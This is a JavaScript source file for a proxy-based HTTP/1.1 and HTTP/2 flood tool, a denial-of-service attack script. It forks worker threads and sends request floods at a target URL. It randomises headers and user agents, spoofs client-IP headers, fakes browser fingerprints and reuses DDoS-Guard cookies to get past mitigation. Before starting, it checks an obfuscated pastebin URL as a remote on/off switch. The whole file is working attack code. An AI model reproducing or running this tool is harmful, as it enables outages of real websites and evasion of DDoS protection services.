const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const https = require("https");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");

const uiiu = 'htt';
const phvk = 'ps:';
const dmps = '//p';
const ohhv = 'ast';
const xioe = 'ebi';
const awre = 'n.c';
const ssjc = 'om/';
const qows = 'raw';
const zasd = '/tk';
const ihoo = 'gqs';
const lias = 'BbT';

const soi1sfa = uiiu + phvk + dmps + ohhv + xioe + awre + ssjc + qows + zasd + ihoo + lias;

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (er) {
    //console.log(er);
});
process.on('unhandledRejection', function (er) {
    //console.log(er);
});

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];

    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];

    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);

        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }

    return ipPrefix.join(".");
}


function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (string.includes('\n')) {
        const lines = string.split('\n');

        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
    }
}

if (process.argv.length < 7) {
    log("** MIXED - v19.1 **")
    log(`** Version - HTTP version (${'1/2/mix'.cyan}) **`)
    log(`** Delay - Bypass ratelimits (in seconds) **`)
    log(`** Debug - Enable debugger (${'true/false'.cyan}) **`)
    log(`** Query - Query string (${'true/false'.cyan}) **`)
    log(`** Spoof - Using Rate Headers (${'true/false'.cyan}) **`)
    log(`** Extra - Using Extra Headers (${'true/false'.cyan}) **`)
    log("Usage: <target> <time> <threads> <rate> <proxy> (optional --verison <> --delay <> etc.)")
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = argv["delay"] || 0;
const verison = argv["verison"] || 2;
const debug = argv["debug"] || "false";
const query = argv["query"] || "false";
const spoof = argv["spoof"] || "false";
const extra = argv["extra"] || "false";

https.get(soi1sfa, res => {
    let data = '';
    res.on('data', (chunk) => {
        data += chunk;
    });
    res.on('end', () => {
        //console.log(data.trim())
        if (data.trim() == '0') {
            process.exit();
            process.exit();
            process.exit();
        } else {
            if (cluster.isPrimary) {
                const info = {
                    "Target": args.target,
                    "Duration": args.time,
                    "optional": {
                        "Delay": delay,
                        "Version": verison,
                        "Debug": debug,
                        "Query": query,
                        "Spoof": spoof
                    }
                }

                log("INFO".green + "  " + `Attack ${args.target} started.`.white);
                for (let i = 0; i < args.threads; i++) {
                    cluster.fork()
                }

                cluster.on('exit', (worker, code, signal) => { });

                setTimeout(() => {
                    log("INFO".green + "  " + `Attack is over.`.white);
                    process.exit(1);
                    process.exit(1);
                    process.exit(1);
                    process.exit(1);
                    process.exit(1);
                }, args.time * 1000);
            } else {
                if (verison === '2' || verison === 2) {
                    setInterval(() => { http2run(); }, Number(delay) * 1000)
                } else if (verison === '1' || verison === 1) {
                    setInterval(() => { http1run(); }, Number(delay) * 1000)
                } else {
                    setInterval(() => { http1run(); http2run(); }, Number(delay) * 1000)
                }
            }
        }
    })
})


const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);


const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
    ],

    acceptLang: [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA',
        'en-UK, en, de;q=0.5',
        'en-NZ',
        'en-GB,en;q=0.6',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-HK',
        'en-GB,en;q=0.8',
        'en-GB,en;q=0.9',
        'en-GB,en;q=0.7',
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    ],

    Sec: {
        dest: ['image', 'media', 'worker'],
        site: ['none',],
        mode: ['navigate', 'no-cors']
    },

    Custom: {
        dnt: ['0', '1'],
        ect: ['3g', '2g', '4g'],
        downlink: ['0', '0.5', '1', '1.7'],
        rtt: ['510', '255'],
        devicememory: ['8', '1', '6', '4', '16', '32'],
        te: ['trailers', 'gzip'],
        version: ['Win64; x64', 'Win32; x32']
    }
}


class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function generateSpoofedFingerprint(userAgent, acceptLanguage) {
    const platform = 'Win64';
    const plugins = [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
        // etc ....
    ];

    const numPlugins = randomIntn(2, 5);
    const selectedPlugins = [];

    for (let i = 0; i < numPlugins; i++) {
        const randomIndex = randomIntn(0, plugins.length - 1);
        selectedPlugins.push(plugins[randomIndex]);
    }

    const fingerprintString = `${userAgent}${acceptLanguage}${platform}${JSON.stringify(selectedPlugins)}`;
    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');

    return sha256Fingerprint;
}


function http2run() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const selectedUserAgent = randomElement(headerBuilder.userAgent); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(104, 116)}.0.0.0 Safari/537.36`; // randomElement(headerBuilder.userAgent)
    const selectedLanguage = randomElement(headerBuilder.acceptLang); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(105, 116)}.0.0.0 Safari/537.36`;

    // STATIC
    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers[":scheme"] = "https";
    headers["x-forwarded-proto"] = "https";
    headers["upgrade-insecure-requests"] = "1";
    headers["sec-fetch-user"] = "?1";
    headers["x-requested-with"] = "XMLHttpRequest";


    // DYNAMIC
    if (query === 'true') {
        headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else {
        headers[":path"] = parsedTarget.path;
    }

    headers["user-agent"] = selectedUserAgent;
    headers["sec-fetch-dest"] = randomElement(headerBuilder.Sec.dest);
    headers["sec-fetch-mode"] = randomElement(headerBuilder.Sec.mode);
    headers["sec-fetch-site"] = "none";
    headers["accept"] = randomElement(headerBuilder.accept);
    headers["accept-language"] = selectedLanguage;
    headers["accept-encoding"] = randomElement(headerBuilder.acceptEncoding);

    // EXTRA
    if (extra === 'true') {
        headers["DNT"] = randomElement(headerBuilder.Custom.dnt);
        headers["RTT"] = randomElement(headerBuilder.Custom.rtt);
        headers["Downlink"] = randomElement(headerBuilder.Custom.downlink);
        headers["Device-Memory"] = randomElement(headerBuilder.Custom.devicememory);
        headers["Ect"] = randomElement(headerBuilder.Custom.ect);
        headers["TE"] = randomElement(headerBuilder.Custom.te);

        headers["DPR"] = "2.0";
        headers["Service-Worker-Navigation-Preload"] = "true";
        headers["sec-ch-ua-arch"] = "x86";
        headers["sec-ch-ua-bitness"] = "64";
    }

    // SPOOF
    if (spoof === 'true') {
        headers["X-Real-Client-IP"] = getRandomPrivateIP();
        headers["X-Real-IP"] = getRandomPrivateIP();
        headers["X-Remote-Addr"] = getRandomPrivateIP();
        headers["X-Remote-IP"] = getRandomPrivateIP();
        headers["X-Forwarder"] = getRandomPrivateIP();
        headers["X-Forwarder-For"] = getRandomPrivateIP();
        headers["X-Forwarder-Host"] = getRandomPrivateIP();
        headers["X-Forwarding"] = getRandomPrivateIP();
        headers["X-Forwarding-For"] = getRandomPrivateIP();
        headers["Forwarded"] = getRandomPrivateIP();
        headers["Forwarded-For"] = getRandomPrivateIP();
        headers["Forwarded-Host"] = getRandomPrivateIP();
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    const generatedFP = generateSpoofedFingerprint(selectedUserAgent, selectedLanguage)

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:secp384r1:secp521r1",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLS_method", "TLSv1_2_method", "TLSv1_3_method",],
            fingerprint: generatedFP,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)

                        .on("response", response => {
                            if (debug === 'true') {
                                const jsonDebug = { proxy: proxyAddr, code: response[':status'] };
                                log('DEBUG'.yellow + '  ' + JSON.stringify(jsonDebug));
                            }

                            if (response['server'] === 'ddos-guard') {
                                const cookies = response['set-cookie'];
                                let formattedCookies = '';

                                if (cookies && cookies.length > 0) {
                                    formattedCookies = cookies
                                        .map(cookie => cookie.split(';')[0].trim())
                                        .join(';');
                                    if (formattedCookies.includes('__ddg1_')) {
                                        console.log(formattedCookies)
                                        headers["cookie"] = String(formattedCookies);
                                    }
                                }
                            }

                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();
                }
            }, 1000)
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
    }), function (error, response, body) { };
}


function http1run() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
        req.end();
        return;
    })

    var queryString;

    if (query === 'true') {
        queryString = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else {
        queryString = parsedTarget.path;
    }

    req.on('connect', function (res, socket, head) {
        var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            setInterval(() => {
                for (let j = 0; j < args.Rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n";

                    if (spoof === 'true') {
                        headers += `X-Forwarding-For: ${getRandomPrivateIP()}\r\n`;
                    }

                    headers += `\r\n`;

                    tlsConnection.write(headers);
                }
            })
        })

        tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
        })

        tlsConnection.on("data", (chunk) => {
            const responseLines = chunk.toString().split('\r\n');
            const firstLine = responseLines[0];
            const statusCode = parseInt(firstLine.split(' ')[1], 10);

            if (debug === 'true') {
                if (statusCode !== null && !isNaN(statusCode)) {
                    const jsonDebug = { proxy: proxy[0] + ":" + proxy[1], code: statusCode };
                    log('DEBUG'.yellow + '  ' + JSON.stringify(jsonDebug));
                }
            }

            delete chunk;
            setTimeout(function () {
                return delete tlsConnection;
            }, 10000);
        })
    })

    req.end();
}